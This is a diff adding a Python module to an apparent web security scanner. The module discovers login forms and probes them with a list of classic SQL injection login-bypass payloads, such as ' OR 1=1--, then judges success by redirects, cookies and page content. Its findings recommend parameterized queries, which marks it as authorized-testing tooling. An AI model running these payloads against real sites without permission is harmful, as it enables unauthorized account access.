@@ -1,0 +1,393 @@
+"""Login form discovery and authentication-bypass auditing.
+
+Finds login forms on a target (password fields, auth-ish actions) and probes
+them with classic SQL login-bypass payloads (``' OR 1=1--``,
+``administrator'--``, …), comparing each response against a baseline failed
+login to spot successful authentication without valid credentials.
+"""
+
+from __future__ import annotations
+
+from difflib import SequenceMatcher
+from urllib.parse import urljoin
+
+import httpx
+from bs4 import BeautifulSoup
+
+from .discovery.parsers import extract_forms
+from .models import LoginAuditResult, LoginBypassFinding, LoginForm
+
+USER_AGENT = "darco/0.1 (login auditor)"
+
+# Extra paths probed when looking for login pages.
+LOGIN_PATHS = (
+    "/login",
+    "/signin",
+    "/sign-in",
+    "/logon",
+    "/auth",
+    "/account/login",
+    "/admin/login",
+    "/user/login",
+    "/wp-login.php",
+)
+
+# Hidden field names commonly used for CSRF tokens.
+CSRF_FIELDS = {
+    "csrf",
+    "csrf_token",
+    "csrfmiddlewaretoken",
+    "authenticity_token",
+    "__requestverificationtoken",
+    "_token",
+    "xsrf-token",
+}
+
+# Classic SQL login-bypass payloads (tried in the username field first).
+LOGIN_BYPASS_PAYLOADS = (
+    "' OR 1=1--",
+    "administrator'--",
+    "admin'--",
+    "' OR '1'='1",
+    "' OR '1'='1'--",
+    "' OR 1=1 #",
+    "' OR '1'='1' #",
+    '" OR "1"="1',
+    "1' OR '1'='1",
+    "'='",
+)
+
+_ACCOUNT_REDIRECT_HINTS = ("account", "profile", "dashboard", "home", "my-")
+_LOGGED_IN_HINTS = (
+    "logout",
+    "log out",
+    "sign out",
+    "welcome",
+    "logged in",
+    "my account",
+    "dashboard",
+)
+_ERROR_HINTS = ("invalid", "incorrect", "failed", "error", "not found", "forbidden")
+
+
+def _default_client(timeout: float, verify: bool) -> httpx.Client:
+    return httpx.Client(
+        timeout=timeout, verify=verify, follow_redirects=False, trust_env=False
+    )
+
+
+def is_login_form(form) -> bool:
+    """Heuristic: a form is a login form if it has a password input or an auth action."""
+    inputs = getattr(form, "inputs", []) or []
+    if any(i.type == "password" for i in inputs):
+        return True
+    action = (getattr(form, "action", "") or "").lower()
+    return any(k in action for k in ("login", "signin", "signon", "logon", "auth"))
+
+
+def _to_login_form(form, page_url: str) -> LoginForm:
+    inputs = form.inputs or []
+    username = next(
+        (
+            i
+            for i in inputs
+            if i.name
+            and (
+                i.name.lower() in ("username", "user", "login", "email", "mail", "loginname")
+                or i.type in ("username", "email")
+            )
+        ),
+        None,
+    )
+    password = next((i for i in inputs if i.type == "password"), None)
+    csrf = next(
+        (i for i in inputs if i.name and i.name.lower() in CSRF_FIELDS),
+        None,
+    )
+    return LoginForm(
+        url=page_url,
+        action=form.action or page_url,
+        method=(form.method or "POST").upper(),
+        username_field=username.name if username else None,
+        password_field=password.name if password else None,
+        csrf_field=csrf.name if csrf else None,
+        captcha=bool(getattr(form, "captcha", False)),
+    )
+
+
+def find_login_forms(
+    url: str,
+    *,
+    timeout: float = 10.0,
+    verify: bool = True,
+    probe_common_paths: bool = True,
+    client_factory=_default_client,
+) -> list[LoginForm]:
+    """Fetch the target page (plus common login paths) and return login forms."""
+    forms: list[LoginForm] = []
+    pages = [url]
+    if probe_common_paths:
+        pages += [urljoin(url, p) for p in LOGIN_PATHS]
+    client = client_factory(timeout, verify)
+    try:
+        seen: set[tuple[str, str]] = set()
+        for page in pages:
+            try:
+                resp = client.get(
+                    page, headers={"User-Agent": USER_AGENT}
+                )
+            except (httpx.HTTPError, OSError):
+                continue
+            if resp.status_code >= 400:
+                continue
+            content_type = resp.headers.get("content-type", "")
+            body = resp.text
+            if "html" not in content_type and "<form" not in body.lower():
+                continue
+            soup = BeautifulSoup(body, "html.parser")
+            for form in extract_forms(soup, str(resp.url)):
+                if not is_login_form(form):
+                    continue
+                lf = _to_login_form(form, str(resp.url))
+                key = (lf.action, lf.method)
+                if key in seen:
+                    continue
+                seen.add(key)
+                forms.append(lf)
+    finally:
+        try:
+            client.close()
+        except Exception:  # noqa: BLE001
+            pass
+    return forms
+
+
+def login_forms_from_forms(forms: list) -> list[LoginForm]:
+    """Convert already-parsed (crawled) Form models into LoginForm models."""
+    out: list[LoginForm] = []
+    seen: set[tuple[str, str]] = set()
+    for form in forms:
+        if not is_login_form(form):
+            continue
+        lf = _to_login_form(form, form.action)
+        key = (lf.action, lf.method)
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append(lf)
+    return out
+
+
+def _response_signature(resp) -> dict:
+    return {
+        "status": resp.status_code,
+        "location": (resp.headers.get("location") or "").lower(),
+        "cookies": {c.name for c in resp.cookies.jar},
+        "body": (resp.text or "").lower(),
+    }
+
+
+def _similarity(a: str, b: str) -> float:
+    if a == b:
+        return 1.0
+    if not a or not b:
+        return 0.0
+    return SequenceMatcher(None, a[:4000], b[:4000]).ratio()
+
+
+def _matched_markers(text: str, markers: tuple[str, ...]) -> list[str]:
+    return [m for m in markers if m in text]
+
+
+def _landing_markers(resp, client) -> list[str]:
+    """Follow a redirect with the session-carrying client and find login markers."""
+    if client is None:
+        return []
+    target = resp.headers.get("location") or ""
+    if not target:
+        return []
+    try:
+        landed = client.get(
+            urljoin(str(resp.url), target),
+            headers={"User-Agent": USER_AGENT},
+        )
+        return _matched_markers((landed.text or "").lower(), _LOGGED_IN_HINTS)
+    except (httpx.HTTPError, OSError):
+        return []
+
+
+def _is_login_success(resp, base: dict, client=None) -> tuple[str, str] | None:
+    """Return (success_indicator, detail) if the response looks like a logged-in state."""
+    loc = (resp.headers.get("location") or "").lower()
+    body = (resp.text or "").lower()
+
+    # Redirect straight into an account area — the classic bypass signature.
+    if resp.status_code in (301, 302, 303, 307, 308) and any(
+        h in loc for h in _ACCOUNT_REDIRECT_HINTS
+    ) and not any(h in loc for h in ("login", "signin", "error")):
+        detail = f"redirect to '{loc}'"
+        markers = _landing_markers(resp, client)
+        if markers:
+            detail += f" — landed page matched login keywords: {', '.join(markers)}"
+        return "redirect_to_account", detail
+
+    # A redirect where the baseline didn't redirect (and not back to login).
+    if (
+        resp.status_code in (301, 302, 303, 307, 308)
+        and base["status"] not in (301, 302, 303, 307, 308)
+        and not any(h in loc for h in ("login", "signin", "error", "logout"))
+    ):
+        detail = f"redirect to '{loc}'"
+        markers = _landing_markers(resp, client)
+        if markers:
+            detail += f" — landed page matched login keywords: {', '.join(markers)}"
+        return "unexpected_redirect", detail
+
+    # Authenticated page content (logout/welcome/account) without error hints.
+    if any(h in body for h in _LOGGED_IN_HINTS) and not any(
+        h in body for h in _ERROR_HINTS
+    ):
+        matched = _matched_markers(body, _LOGGED_IN_HINTS)
+        return (
+            "authenticated_content",
+            f"page contains login keywords: {', '.join(matched)}",
+        )
+
+    # A brand-new session/role cookie vs the failed-login baseline.
+    base_cookies = base["cookies"]
+    resp_cookies = {c.name for c in resp.cookies.jar}
+    new_cookies = resp_cookies - base_cookies
+    if new_cookies:
+        return "new_session_cookie", f"new cookie(s): {', '.join(sorted(new_cookies))}"
+
+    # Strong content divergence from the failed-login page (and not an error page).
+    if (
+        base["status"] == resp.status_code
+        and _similarity(base["body"], resp.text or "") < 0.55
+        and not any(h in body for h in _ERROR_HINTS)
+    ):
+        return "content_change", "response differs strongly from the failed-login page"
+
+    return None
+
+
+def audit_login_forms(
+    forms: list[LoginForm],
+    *,
+    target: str = "",
+    payloads: tuple[str, ...] | None = None,
+    timeout: float = 10.0,
+    verify: bool = True,
+    test_password_field: bool = False,
+    username_override: str | None = None,
+    password_override: str | None = None,
+    client_factory=_default_client,
+) -> LoginAuditResult:
+    """Audit login forms for SQL authentication-bypass payloads."""
+    payloads = payloads or LOGIN_BYPASS_PAYLOADS
+    bypasses: list[LoginBypassFinding] = []
+    notes: list[str] = []
+    tested = 0
+    client = client_factory(timeout, verify)
+    try:
+        for form in forms:
+            uname_field = username_override or form.username_field or "username"
+            pwd_field = password_override or form.password_field or "password"
+
+            # Pull hidden inputs (CSRF etc.) fresh from the page so tokens stay valid.
+            hidden: dict[str, str] = {}
+            if form.url:
+                try:
+                    page = client.get(form.url, headers={"User-Agent": USER_AGENT})
+                    if page.status_code < 400:
+                        soup = BeautifulSoup(page.text, "html.parser")
+                        for f in extract_forms(soup, form.url):
+                            if f.action == form.action and f.method.upper() == form.method:
+                                hidden = {
+                                    i.name: i.default or ""
+                                    for i in f.inputs
+                                    if i.hidden and i.name
+                                }
+                                break
+                except (httpx.HTTPError, OSError):
+                    pass
+
+            def attempt(u: str, p: str) -> httpx.Response:
+                data = dict(hidden)
+                data[uname_field] = u
+                data[pwd_field] = p
+                return client.post(
+                    form.action,
+                    data=data,
+                    headers={"User-Agent": USER_AGENT},
+                )
+
+            tested += 1
+            base = attempt("darco-baseline-user", "darco-wrong-password-42")
+            base_sig = _response_signature(base)
+
+            probed_fields = [(uname_field, payloads)]
+            if test_password_field and form.password_field:
+                probed_fields.append((pwd_field, payloads))
+
+            for field, field_payloads in probed_fields:
+                for payload in field_payloads:
+                    other = (
+                        "darco-wrong-password-42"
+                        if field == uname_field
+                        else "administrator"
+                    )
+                    resp = attempt(payload if field == uname_field else other, payload if field == pwd_field else other)
+                    verdict = _is_login_success(resp, base_sig, client)
+                    if not verdict:
+                        continue
+                    indicator, detail = verdict
+                    bypasses.append(
+                        LoginBypassFinding(
+                            param=field,
+                            payload=payload,
+                            confidence=(
+                                "high"
+                                if indicator in ("redirect_to_account", "authenticated_content")
+                                else "medium"
+                            ),
+                            success_indicator=indicator,
+                            evidence=(
+                                f"Payload '{payload}' in '{field}' produced a logged-in state "
+                                f"({detail}) vs baseline failed login "
+                                f"(status {base_sig['status']})."
+                            ),
+                            suggestion=(
+                                f"Authentication on '{form.action}' is bypassable — the "
+                                f"'{field}' value reaches SQL unparameterized. Use parameterized "
+                                f"queries and treat auth queries as untrusted input."
+                            ),
+                        )
+                    )
+
+            if not form.username_field and not form.password_field:
+                notes.append(
+                    f"Form at '{form.action}' has no recognizable username/password fields — skipped probing."
+                )
+    finally:
+        try:
+            client.close()
+        except Exception:  # noqa: BLE001
+            pass
+
+    return LoginAuditResult(
+        target=target,
+        forms_found=forms,
+        tested_forms=tested,
+        bypasses=bypasses,
+        notes=notes,
+    )
+
+
+__all__ = [
+    "LOGIN_BYPASS_PAYLOADS",
+    "find_login_forms",
+    "login_forms_from_forms",
+    "is_login_form",
+    "audit_login_forms",
+]
